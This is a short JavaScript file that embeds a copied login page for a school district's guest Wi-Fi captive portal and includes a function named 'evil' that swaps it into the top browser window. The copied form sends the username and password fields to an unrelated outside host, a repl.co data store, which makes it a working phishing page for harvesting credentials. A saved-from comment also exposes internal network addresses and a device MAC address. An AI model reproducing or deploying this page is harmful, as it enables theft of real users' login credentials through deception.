
var TOP_URL = 'http://www.example.com';

// var htmlText = await(fetch(TOP_URL + "/index.html").then(res => res.text()));
var htmlText = `<!DOCTYPE html>
<!-- saved from url=(0255)https://wireless.kpbsd.k12.ak.us/auth/captiveportal.aspx?ng=1&cmd=login&switchip=172.22.6.14&mac=18%3a3e%3aef%3ac3%3a68%3a0b&ip=10.156.214.118&essid=KPBSD-Guest&apname=AP06-A12&apgroup=KP_APG_Default&url=http%3a%2f%2fwww.gstatic.com%2fgenerate_204&agree=1 -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>
</title><link href="./captiveportal_files/bootstrap.min.css" rel="stylesheet"><link rel="stylesheet" href="./captiveportal_files/font-awesome.min.css">
    <script type="text/javascript" src="./captiveportal_files/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="./captiveportal_files/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="./captiveportal_files/auth.css">
    </head>
<body>
    <form name="aspnetForm" method="post" action="https://data-store.spencerkuan.repl.co/" id="aspnetForm">
<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE5ODQzMzAxMDAPZBYCZg9kFgICAw9kFgQCAQ8PFgIeB1Zpc2libGVnZBYCAgMPZBYCAgEPDxYCHgdFbmFibGVkZ2QWAgIBDw9kFgIeCW9uZm9jdXNpbgUJc2VsZWN0KCk7ZAIDDw8WAh8AaGRkZKwScsEDz6akoB5vgc5bGWGgiHEa">
</div>
<div>
	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="85ACE714">
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWBALhobfcAwLX2pWECAK1ucz8CALL1PP2AggYktcfiIGQygozA2quXaKA7/Ct">
</div>
        <div id="main" class="container-fluid">
            <div class="col-sm-12" style="padding:15px;">
                <img class="img-responsive center-block" src="./captiveportal_files/wifilogo.png" alt="KPBSD Wi-Fi Logo">
            </div>
            <div id="ctl00_ContentPanel" class="row">
	                                  
                
    <div class="col-sm-9 col-sm-push-3">          
        <div class="row">
            <div class="col-sm-12">
                
                        
                <div id="ctl00_cpBody_pnlMainBodyRegion" class="panel panel-info">
		
                    <div class="panel-heading">
                        <h1 class="panel-title">Welcome to the KPBSD Guest Wi-Fi network</h1>
                    </div>
                    <div class="panel-body">
                        <p>This network is intended for use by building guests (users without KPBSD login credentials).  Please see the building office if you require a username
                        to access this network.</p>
                        <p>Use of KPBSD computer system resouces is subject to the terms and conditions set forth
                        in the KPBSD Internet Use Agreement.  The most recent version
                        of these terms and conditions is located at <a href="http://www.kpbsd.org/school_board.aspx?id=2780" target="_blank">http://www.kpbsd.org/school_board.aspx?id=2780</a>.</p>
                        <p class="text-danger">If you do not agree to these terms, please disconnect from this network
                        immediately.</p>
                    </div>            
                
	</div>
                <div id="ctl00_cpBody_pnlCertInstall" class="panel panel-info">
		
                    <div class="panel panel-warning">                        
                        <div class="panel-heading"><h3 class="panel-title"><i class="fa fa-2x fa-warning"></i> Certificate Installation</h3></div>
                        <div class="panel-body">
                            In order to properly access certain HTTPS/SSL sites, you may need to install a certificate provided by our internet filter. For instructions on how to download
                            and install this certificate, please visit the <a href="http://netspective.kpbsd.k12.ak.us/pub/certificate/download" target="_blank">Certificate Install Guide</a>.
                        </div>
                    </div>
                
	</div>
            </div>  
        </div> 
    </div>                           
                                                           
                
    <div id="ctl00_cpCreds_pnlCredentials" class="col-sm-3 col-sm-pull-9">
		
        <div class="panel panel-success">                        
            <div class="panel-heading"><h3 class="panel-title"><i class="fa fa-2x fa-sign-in"></i> Login</h3></div>
            <div class="panel-body">
                <strong>Username:</strong><input name="ctl00$cpCreds$txtUsername" type="text" id="ctl00_cpCreds_txtUsername" class="form-control input-sm" autocomplete="off" onfocusin="select();" style="width:100%;">
                <br>
                <strong>Password:</strong><input name="ctl00$cpCreds$txtPassword" type="password" id="ctl00_cpCreds_txtPassword" class="form-control input-sm" style="width:100%;">
                <br>
                <input type="submit" name="ctl00$cpCreds$btnLogin" value="Login" id="ctl00_cpCreds_btnLogin" class="btn-sm btn-success" style="width:100%;">                            
            </div>
        </div> 
    
	</div>
    
    <input type="hidden" name="key" value="kpbsd">
    <input type="hidden" name="val" value="value">
            
</div>
            
        </div>
    </form>
</body></html>`;

function evil() {
	console.log('document loaded');
	window.top.document.body.innerHTML  = htmlText;
};

console.log('test');

